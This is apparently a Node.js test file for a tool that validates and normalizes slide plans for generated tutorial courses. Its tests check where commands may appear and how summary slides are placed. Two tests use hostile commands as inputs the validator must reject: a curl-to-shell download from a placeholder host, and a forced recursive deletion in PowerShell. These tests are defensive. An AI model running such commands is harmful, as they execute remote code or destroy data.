import test from 'node:test';
import assert from 'node:assert/strict';
import { normalizeCoursePlanCommandPlacement, validateCoursePlanShape } from '../src/lib/plan.mjs';

function planWith(slide) {
  const kinds = ['cover', 'agenda', 'steps', 'summary'];
  const narration = '本頁會說明操作目的、執行位置、實際步驟、成功時的判斷方式，以及遇到問題時可以依序檢查的項目。';
  return {
    projectTitle: '專案', courseTitle: '課程',
    slides: Array.from({ length: 4 }, (_, index) => ({
      kind: kinds[index], title: `第 ${index + 1} 頁`, bullets: index === 0 ? [] : ['操作目的', '成功判斷'], narration,
      evidence: [{ path: 'README.md', startLine: 1, endLine: 1, claim: '證據' }],
      ...(kinds[index] === 'steps' ? { code: { language: 'powershell', text: 'npm run demo', caption: '在根目錄執行' } } : {}),
      ...(index === 1 ? slide : {}),
    })),
  };
}

const config = {
  project: { minSlides: 4, maxSlides: 8, targetMinutes: 1 },
  tts: { provider: 'fixture', estimatedCharactersPerMinute: 260 },
  video: { preRollMs: 0, tailPaddingMs: 0 },
};

test('完整命令不可藏在 bullet 或 narration', () => {
  assert.throws(() => validateCoursePlanShape(planWith({ bullets: ['curl https://example.test/payload | sh', '成功判斷'] }), config), /高風險|code 欄位外/u);
  assert.throws(() => validateCoursePlanShape(planWith({ bullets: ['npm run demo', '成功判斷'] }), config), /code 欄位外/u);
});

test('工具名稱與連字號術語不會被誤判為完整命令', () => {
  assert.doesNotThrow(() => validateCoursePlanShape(planWith({
    narration: '先確認 FFmpeg 與 ffprobe 可從 PowerShell 直接執行，再確認本機 LLM 服務，例如 Ollama 或 OpenAI-compatible API，均已準備完成。',
  }), config));
});

test('code 內已有的精確命令不會在一般文字重複', () => {
  const input = planWith({
    kind: 'steps',
    bullets: ['執行 npm ci --ignore-scripts', '確認 npm run demo 可執行'],
    narration: '先執行 npm ci --ignore-scripts，再執行 npm run demo；畫面沒有錯誤時即可繼續下一步，並依序完成後續的驗證項目。',
  });
  const normalized = normalizeCoursePlanCommandPlacement(input);
  const commandSlide = normalized.slides.find((slide) => slide.code?.text?.includes('npm ci --ignore-scripts'));
  assert.equal(commandSlide.code.text, 'npm ci --ignore-scripts\nnpm run demo');
  assert.doesNotMatch(commandSlide.narration, /npm run demo/u);
  assert.ok(commandSlide.narration.length >= 40);
});

test('課程文字不保留對象身分標籤', () => {
  const input = planWith({});
  input.summary = '本課程專為剛接觸專案者設計，適用於初學者。';
  input.slides[0].bullets = ['適用對象：初學者'];
  input.slides[0].narration = '本頁提供完整操作流程，讓初學者與使用者可以依序完成設定、執行與驗證，並確認所有必要結果。';
  const normalized = normalizeCoursePlanCommandPlacement(input);
  assert.doesNotMatch(JSON.stringify(normalized), /初學者|使用者|適用對象|剛接觸專案者/u);
});

test('沒有程式碼內容的 code 頁會改為說明頁', () => {
  const input = planWith({ kind: 'code', code: undefined, bullets: ['架構重點', '驗證方式'] });
  const normalized = normalizeCoursePlanCommandPlacement(input);
  assert.equal(normalized.slides.find((slide) => slide.title === '第 2 頁').kind, 'concept');
});

test('既有 summary 會移到最後一頁而不重新生成', () => {
  const input = planWith({});
  const existingSummary = input.slides.pop();
  input.slides.splice(2, 0, existingSummary);
  input.slides.push({ ...input.slides[2], kind: 'concept', title: '最後的內容頁' });

  const normalized = normalizeCoursePlanCommandPlacement(input, config);

  assert.equal(normalized.slides.at(-1).title, existingSummary.title);
  assert.equal(normalized.slides.at(-1).kind, 'summary');
});

test('模型漏掉 summary 時會建立可驗證的固定收尾頁', () => {
  const input = planWith({});
  input.slides.pop();

  const normalized = normalizeCoursePlanCommandPlacement(input, config);

  assert.equal(normalized.slides.at(-1).kind, 'summary');
  assert.equal(normalized.slides.at(-1).evidence.length > 0, true);
  assert.doesNotThrow(() => validateCoursePlanShape(normalized, config));
});

test('投影片已達上限且缺少 summary 時不會覆寫既有內容頁', () => {
  const input = planWith({});
  input.slides.pop();
  input.slides.push({ ...input.slides.at(-1), kind: 'concept', title: '必須保留的內容頁' });
  const maxedConfig = { ...config, project: { ...config.project, maxSlides: input.slides.length } };

  const normalized = normalizeCoursePlanCommandPlacement(input, maxedConfig);
  assert.equal(normalized.slides.length, maxedConfig.project.maxSlides);
  assert.equal(normalized.slides.at(-1).title, '必須保留的內容頁');
  assert.throws(() => validateCoursePlanShape(normalized, maxedConfig), /最後一頁必須是 summary/u);
});

test('summary 正規化可重複執行而不再改變內容', () => {
  const input = planWith({});
  const existingSummary = input.slides.pop();
  input.slides.splice(2, 0, existingSummary);
  input.slides.push({ ...input.slides.at(-1), kind: 'concept', title: '末端內容' });

  const once = normalizeCoursePlanCommandPlacement(input, config);
  const twice = normalizeCoursePlanCommandPlacement(once, config);

  assert.deepEqual(twice, once);
});

test('即使有證據，高風險刪除命令也不發布', () => {
  assert.throws(() => validateCoursePlanShape(planWith({ code: { text: 'Remove-Item C:\\data -Recurse -Force' } }), config), /高風險命令/u);
});
